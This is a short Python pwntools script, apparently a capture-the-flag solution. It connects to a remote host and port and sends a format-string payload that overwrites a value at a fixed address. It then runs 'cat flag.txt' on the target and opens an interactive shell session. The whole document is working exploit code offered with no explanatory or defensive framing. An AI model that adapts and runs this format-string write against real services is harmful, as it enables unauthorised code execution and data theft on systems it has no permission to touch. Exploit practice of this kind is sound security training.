from pwn import *

context.arch = 'amd64'
c = connect('103.77.175.40', 6101)

target_add = 0x4034a4

payload =fmtstr_payload(10, {target_add:1869768040})

c.sendlineafter(b'say?', payload)
c.sendline(b'cat flag.txt')
c.interactive()